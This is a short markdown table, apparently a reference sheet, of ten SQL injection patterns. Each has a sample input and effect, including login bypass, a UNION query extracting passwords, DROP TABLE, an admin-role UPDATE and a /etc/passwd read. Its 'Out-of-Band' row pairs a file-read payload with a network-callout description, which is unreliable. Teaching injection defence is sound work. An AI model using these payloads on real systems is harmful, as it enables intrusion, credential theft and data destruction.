| Pattern Type                | Example User Input                               | Effect / Goal                                                |
|-----------------------------|--------------------------------------------------|--------------------------------------------------------------|
| **Authentication Bypass**  | `' OR '1'='1`                                     | Always true condition → bypass login                         |
| **Tautology Injection**     | `' OR 'a'='a`                                     | Forces query to return all rows                              |
| **Union-based Injection**   | `' UNION SELECT username, password FROM users --`| Extracts data from other tables                              |
| **Comment Injection**       | `admin' --`                                       | Comments out the rest of the query                           |
| **Piggybacked Queries**     | `1; DROP TABLE users --`                          | Executes an additional malicious query                       |
| **Boolean-based Blind**     | `' AND 1=1 --` / `' AND 1=2 --`                   | Observes changes in response to infer data                   |
| **Time-based Blind**        | `' OR IF(1=1, SLEEP(5), 0) --`                    | Uses delays to detect vulnerabilities without direct output  |
| **Out-of-Band (OOB)**       | `' UNION SELECT LOAD_FILE('/etc/passwd') --`      | Reads files or triggers DNS/HTTP requests to attacker server |
| **Order By Injection**      | `' ORDER BY 1 --`                                 | Used to guess column counts                                  |
| **Stacked Queries**         | `1; UPDATE users SET role='admin' WHERE id=1 --`  | Executes multiple SQL commands in a single request           |
